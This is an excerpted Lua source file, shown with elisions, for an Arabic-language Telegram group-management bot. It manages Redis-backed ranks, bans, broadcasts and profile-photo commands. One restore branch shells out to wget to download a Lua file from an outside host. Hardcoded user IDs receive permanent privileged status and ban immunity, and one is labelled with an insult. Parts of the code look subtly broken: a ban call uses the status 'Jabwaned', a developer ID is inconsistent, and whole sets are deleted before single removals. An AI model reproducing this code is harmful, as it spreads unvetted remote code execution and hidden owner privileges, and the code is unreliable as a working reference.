...
ControllerAll = false
local ListSudos ={Sudo_Id,1965534755,5055146093,1614314857}  
...
DAVJABWA = Redis:sismember(Saidi.."DAVJABWA:Groups",UserId) 
...
if tonumber(UserId) == 1965534755 then
Status = 'المطور جابوا' 
elseif tonumber(UserId) == 1614314857 then
Status = 'جوافه الكلب'
elseif tonumber(UserId) == 5055146093  then
Status = 'المطور جيكا'
...
{
{text = 'اخفاء الامر ⬇️ ', data =IdUser..'/'.. '/delAmr'}
},
}
}
...
return{
JabwaAll = Redis:sismember(Saidi.."JabwaAll:Groups",UserId) ,
ktmall = Redis:sismember(Saidi.."ktmAll:Groups",UserId) ,
JabwaGroup = Redis:sismember(Saidi.."JabwaGroup:Group"..ChatId,UserId) ,
...
msg.Name_Controller = 'جوافه الكلب'
msg.The_Controller = 1
...
elseif Redis:sismember(Saidi.."DAVJABWA:Groups",msg.sender.user_id) == true then
...
if Redis:get(Saidi.."Broadcasting:Groups:Pin" .. msg_chat_id .. ":" .. msg.sender.user_id) then 
if text == "الغاء" or text == '〘 الغاء الامر 〙' then   
Redis:del(Saidi.."Broadcasting:Groups:Pin" .. msg_chat_id .. ":" .. msg.sender.user_id) 
...
if text == 'رفع نسخه جولد' and msg.reply_to_message_id ~= 0 then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n* ⌯ هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
end
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
...
return LuaTele.sendText(msg_chat_id,msg_id,' ⌯ تم استرجاع المجموعات من نسخه جولد')
else
...
os.execute('wget https://adfrv.zzz.com.ua/beb/Saidi.lua')
...
if not Redis:sismember(Saidi.."DevelopersQ:Groups",Jabwaa.id) then
...
if not Redis:sismember(Saidi.."DAVJABWA:Groups",Jabwaa.id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Jabwaa.id," ⌯ تم تنزيله مساعد مسبقا ").Reply,"md",true)  
else
Redis:del(Saidi.."DAVJABWA:Groups")
Redis:del(Saidi.."DAVJABWA:Groups", Jabwaa.id)
Redis:del(Saidi.."id:DAVJABWA:Groups", Jabwaa.id)
...
if not Redis:sismember(Saidi.."Developers:Groups",Jabwaa.id) then
...
if not Redis:sismember(Saidi.."TheBasicsQ:Group"..msg_chat_id,Jabwaa.id) then
...
if not Redis:sismember(Saidi.."TheBasics:Group"..msg_chat_id,Jabwaa.id) then
...
if not Redis:sismember(Saidi.."Originators:Group"..msg_chat_id,Jabwaa.id) then
...
if not Redis:sismember(Saidi.."Managers:Group"..msg_chat_id,Jabwaa.id) then
...
if not Redis:sismember(Saidi.."Addictive:Group"..msg_chat_id,Jabwaa.id) then
...
if not Redis:sismember(Saidi.."Distinguished:Group"..msg_chat_id,Jabwaa.id) then
...
if not Redis:sismember(Saidi.."DAVJABWA:Groups",Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id," ⌯ تم تنزيله مساعد مسبقا ").Reply,"md",true)  
else
Redis:del(Saidi.."DAVJABWA:Groups")
Redis:del(Saidi.."DAVJABWA:Groups", Message_Reply.sender.user_id)
Redis:del(Saidi.."id:DAVJABWA:Groups", Message_Reply.sender.user_id)
...
if not Redis:sismember(Saidi.."DAVJABWA:Groups",UserId) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId," ⌯ تم تنزيله مساعد مسبقا ").Reply,"md",true)  
else
Redis:del(Saidi.."DAVJABWA:Groups")
Redis:del(Saidi.."DAVJABWA:Groups", UserId)
Redis:del(Saidi.."id:DAVJABWA:Groups", UserId)
...
Redis:sadd(Saidi.."DevelopersQ:Groups",Jabwaa.id) 
...
if Redis:sismember(Saidi.."DAVJABWA:Groups",Jabwaa.id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Jabwaa.id," ⌯ تم ترقيته مطور ثانوي مسبقا ").Reply,"md",true)  
else
Redis:del(Saidi.."DAVJABWA:Groups")
Redis:sadd(Saidi.."DAVJABWA:Groups", UserId)
Redis:set(Saidi.."id:DAVJABWA:Groups", UserId)
...
Redis:sadd(Saidi.."Developers:Groups",Jabwaa.id) 
...
Redis:sadd(Saidi.."TheBasicsQ:Group"..msg_chat_id,Jabwaa.id) 
...
Redis:sadd(Saidi.."TheBasics:Group"..msg_chat_id,Jabwaa.id) 
...
Redis:sadd(Saidi.."Originators:Group"..msg_chat_id,Jabwaa.id) 
...
Redis:sadd(Saidi.."Managers:Group"..msg_chat_id,Jabwaa.id) 
...
Redis:sadd(Saidi.."Addictive:Group"..msg_chat_id,Jabwaa.id) 
...
Redis:sadd(Saidi.."Distinguished:Group"..msg_chat_id,Jabwaa.id) 
...
if Redis:sismember(Saidi.."DAVJABWA:Groups",Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id," ⌯ تم ترقيته مساعد مسبقا ").Reply,"md",true)  
else
Redis:del(Saidi.."DAVJABWA:Groups")
Redis:sadd(Saidi.."DAVJABWA:Groups", Message_Reply.sender.user_id)
Redis:set(Saidi.."id:DAVJABWA:Groups", Message_Reply.sender.user_id)
...
if Redis:sismember(Saidi.."DAVJABWA:Groups",UserId) then
...
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = 'ᯓ ᴛᴇᴀᴍ ɢᴏʟᴅ .', url = "http://t.me/AKJA0"}, },}}
return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
...
local Info_Members = Redis:smembers(Saidi.."JabwaGroup:Group"..msg_chat_id) 
if #Info_Members == 0 then
...
Redis:set(Saidi.."rb:Jabwa"..msg_chat_id,true) 
...
Redis:set(Saidi.."Status:JabwaId"..msg_chat_id,true) 
...
if TextMsg == 'ردود السورس' then
Redis:del(Saidi.."rb:Jabwa"..msg_chat_id) 
...
Redis:del(Saidi.."Status:JabwaId"..msg_chat_id) 
...
if Redis:sismember(Saidi.."JabwaAll:Groups",Message_Reply.sender.user_id) then
...
Redis:sadd(Saidi.."JabwaAll:Groups",Message_Reply.sender.user_id) 
...
if not Redis:sismember(Saidi.."JabwaAll:Groups",Message_Reply.sender.user_id) then
...
Redis:srem(Saidi.."JabwaAll:Groups",Message_Reply.sender.user_id) 
...
return LuaTele.sendText(msg_chat_id,msg_id,"\n* ⌯ عذرآ لا تستطيع استخدام الامر على المطور جابوا *","md",true)  
end
if UserId == "1614314857" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n* ⌯ عذرآ لا تستطيع استخدام الامر على جوافه الكلب *","md",true)  
end
if UserId == "5040650961" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n* ⌯ عذرآ لا تستطيع استخدام الامر على المطور جيكا *","md",true)  
end
if Redis:sismember(Saidi.."JabwaAll:Groups",UserId) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId," ⌯ تم حظره عام من المجموعات مسبقا ").Reply,"md",true)  
else
Redis:sadd(Saidi.."JabwaAll:Groups",UserId) 
...
if Redis:sismember(Saidi.."JabwaGroup:Group"..msg_chat_id,UserId) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId," ⌯ تم حظره من الجروب مسبقا ").Reply,"md",true)  
else
Redis:sadd(Saidi.."JabwaGroup:Group"..msg_chat_id,UserId) 
LuaTele.setChatMemberStatus(msg.chat_id,UserId,'Jabwaned',0)
if Jabwa.first_name then
...
if not Redis:sismember(Saidi.."JabwaGroup:Group"..msg_chat_id,UserId) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId," ⌯ تم الغاء حظره من الجروب مسبقا ").Reply,"md",true)  
else
Redis:srem(Saidi.."JabwaGroup:Group"..msg_chat_id,UserId) 
LuaTele.setChatMemberStatus(msg.chat_id,UserId,'restricted',{1,1,1,1,1,1,1,1,1})
...
if photo.total_count > 0 then
local TestText = "  ❲ Saidi  Source ❳\n⦁━═━═━═━═━═━═━═━═━⦁\n ⌯ *Dev Name* :  [".. Jabwa.first_name.."](tg://user?id="..UserId_Info.id..")\n ⌯ *Dev Bio* : [❲ "..Bio.." ❳]"
keyboardd = {} 
keyboardd.inline_keyboard = {
{
{text = '< Developers Saidi  >', url = "https://t.me/M_P_L_6"}
},
}
local msg_id = msg.id/2097152/0.5 
 https.request("https://api.telegram.org/bot"..Token..'/sendPhoto?chat_id='..msg.chat_id..'&caption='..URL.escape(TestText)..'&photo='..photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboardd))
else
local TestText = "- معلومات مطور السورس : \\nn: name Dev . [".. Jabwa.first_name.."](tg://user?id="..UserId_Info.id..")\n\n ["..Bio.."]"
keyboardd = {} 
keyboardd.inline_keyboard = {
{
{text = '< Developers Saidi  >', url = "https://t.me/M_P_L_6"}
...
keyboardd.inline_keyboard = {
{
{text = '< Developers Saidi  >', url = "https://t.me/BoOdY_BaSha"}
},
}
local msg_id = msg.id/2097152/0.5 
 https.request("https://api.telegram.org/bot"..Token..'/sendPhoto?chat_id='..msg.chat_id..'&caption='..URL.escape(TestText)..'&photo='..photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboardd))
...
local id = Redis:get(Saidi.."id:DAVJABWA:Groups")
...
local abnj = "*  ❲ HELP BOT ❳\n⦁━═━═━═━═━═━═━═━═━⦁\n ⌯ *Dev Name* : "..Jabwayt.result.first_name.." \n"
keyJabwayt = {} 
...
local TestT = "*  ❲ HELP BOT ❳\n⦁━═━═━═━═━═━═━═━═━⦁\n ⌯ *HELP NAME* :  "..Jabwayt.result.first_name.." \n"
keyboardd = {} 
keyJabwayt.inline_keyboard = {
{
{text = name, url = "https://t.me/"..Jabwayt.result.username..""},
...
if not Redis:get(Saidi.."rb:Jabwa"..msg_chat_id) then
...
{
{text = ' معني ',  data ='/jajai@'},
},
{
{text = ' احسب ',  data ='/psisjs@'},
},
{
{text = ' الابراج ',  data ='/ksosp@'},
},
}
}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n حمره *',"md",false, false, false, false, reply_markup)
end

if text == "جمالي" or text == 'نسبه جمالي' then
if Redis:get(Saidi.."Status:gamle"..msg.chat_id) then
local photo = LuaTele.getUserProfilePhotos(msg.sender.user_id)
...
data.inline_keyboard = {
{
{text = 'اخفاء الامر ⬇️ ', callback_data = msg.sender.user_id..'/Jabwa88'}, 
},
{
{text = '♻️ صورتك القادمه ♻️', callback_data= msg.sender.user_id..'/Jabwa1'}, 
},
}
local msgg = msg_id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. msg_chat_id .. "&photo="..photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id.."&caption=".. URL.escape(Jabwa_ns).."&reply_to_message_id="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(data))
...
{
{text = '♻️ صورتك القادمه♻️', callback_data= msg.sender.user_id..'/Jabwa89'}, 
},
}
local msgg = msg_id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. msg_chat_id .. "&photo="..photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id.."&caption=".. URL.escape(Jabwa_ns).."&reply_to_message_id="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(data))
...
{
{text = 'اتعطيل ردود السورس', data = msg.sender.user_id..'/'.. 'rb:Jabwa_Jabwa'},{text = 'اتفعيل ردود السورس', data = msg.sender.user_id..'/'.. 'rb:Jabwa_bian'},
},
{
...
{
{text = 'اخفاء الامر ⬇️ ', data =msg.sender.user_id..'/'.. 'delAmr'}
},
}
}
...
if Redis:get(Saidi.."Status:JabwaId"..msg.chat_id)  then
StatusJabwaId = '☑️' else StatusJabwaId = '❎'
end
...
Redis:del(Saidi.."JabwaGroup:Group"..msg_chat_id) 
...
Redis:setex(Saidi.."Broadcasting:Groups:Pin" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
LuaTele.sendText(msg_chat_id,msg_id,[[
↯︙ارسل لي سواء كان 
❨ ملف • ملصق • متحركه • صوره
 • فيديو • بصمه الفيديو • بصمه • صوت • رساله ❩
...
{{text = 'Delete Instagram',url="https://www.instagram.com/accounts/login/?next=/accounts/remove/request/permanent/"},{text = 'Delete Snapchat',url="https://accounts.snapchat.com/accounts/login?continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fdeleteaccount"}},{{text= 'ᯓ ᴛᴇᴀᴍ ɢᴏʟᴅ .',url="https://t.me/AKJA0"}}
}
local msg_id = msg.id/2097152/0.5
...
local myname = user_info.first_name
photo = "http://t.me/AKJA0"
local Name = '*𓄼• ᴡᴇʟᴄᴏᴍᴇ ʏᴀ->* ['..myname..'](tg://user?id='..user_info.id..')\n*𓄼• ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ sᴏᴜʀᴄᴇ ɢᴏʟᴅ*\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
...
local Namebot = (Redis:get(Saidi.."Name:Bot") or "جولد")
local BotName = {
...
local CmdStart = '*\n ⌯ أهلآ بك في بوت '..(Redis:get(Saidi.."Name:Bot") or "جولد")..
...
keyboard.inline_keyboard = {
{
{text = 'اخفاء الامر ⬇️ ', callback_data =IdUser..'/delAmr'}, 
},
{
{text = '♻️ صورتك القادمه♻️ ', callback_data =IdUser..'/Jabwa1'},{text = '♻️ صورتك السابقه♻️ ', callback_data =IdUser..'/delAmr'}, 
},
}
...
{
{text = '♻️ صورتك القادمه ♻️ ', callback_data =IdUser..'/Jabwa2'},{text = '♻️ صورتك السابقه♻️ ', callback_data =IdUser..'/Jabwa0'}, 
},
}
LuaTele.deleteMessages(ChatId,{[1]= Msg_id})
...
{
{text = '♻️ صورتك القادمه ♻️ ', callback_data =IdUser..'/Jabwa3'},{text = '♻️ صورتك السابقه♻️ ', callback_data =IdUser..'/Jabwa1'}, 
},
}
LuaTele.deleteMessages(ChatId,{[1]= Msg_id})
...
{
{text = '♻️ صورتك القادمه ♻️ ', callback_data =IdUser..'/Jabwa4'},{text = '♻️ صورتك السابقه♻️ ', callback_data =IdUser..'/Jabwa2'}, 
},
}
LuaTele.deleteMessages(ChatId,{[1]= Msg_id})
...
{
{text = '♻️ صورتك القادمه ♻️ ', callback_data =IdUser..'/Jabwa5'},{text = '♻️ صورتك السابقه♻️ ', callback_data =IdUser..'/Jabwa3'}, 
},
}
LuaTele.deleteMessages(ChatId,{[1]= Msg_id})
...
{
{text = '♻️ صورتك القادمه ♻️ ', callback_data =IdUser..'/Jabwa6'},{text = '♻️ صورتك السابقه♻️ ', callback_data =IdUser..'/Jabwa4'}, 
},
}
LuaTele.deleteMessages(ChatId,{[1]= Msg_id})
...
{
{text = '♻️ صورتك القادمه ♻️ ', callback_data =IdUser..'/Jabwa7'},{text = '♻️ صورتك السابقه♻️ ', callback_data =IdUser..'/Jabwa5'}, 
},
}
LuaTele.deleteMessages(ChatId,{[1]= Msg_id})
...
{
{text = '♻️ صورتك السابقه ♻️ ', callback_data =IdUser..'/Jabwa0'}, 
},
}
LuaTele.deleteMessages(ChatId,{[1]= Msg_id})
...
if Text == '/jajai@' then
LuaTele.editMessageText(ChatId,Msg_id,"* ⌯  تيست *","md",true) 
Redis:set(Saidi.."Sasa"..IdUser,"asas") 
end 
...
elseif Text and Text:match('(%d+)/rb:Jabwa_Jabwa') then
local UserId = Text:match('(%d+)/rb:Jabwa_Jabwa')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(Saidi.."rb:Jabwa"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'رجوع 🔙', data =UserId..'/'.. 'listallAddorrem'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser," ⌯ تم تعطيل امر الايدي").unLock, 'md', true, false, reply_markup)
end
...
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(Saidi.."Status:JabwaId"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'رجوع 🔙', data =UserId..'/'.. 'listallAddorrem'},},}}
...
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(Saidi.."Status:JabwaId"..ChatId,true) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'رجوع 🔙', data =UserId..'/'.. 'listallAddorrem'},},}}
...
elseif Text and Text:match('(%d+)/rb:Jabwa_bian') then
local UserId = Text:match('(%d+)/rb:Jabwa_bian')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(Saidi.."rb:Jabwa"..ChatId,true) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'رجوع 🔙', data =UserId..'/'.. 'listallAddorrem'},},}}
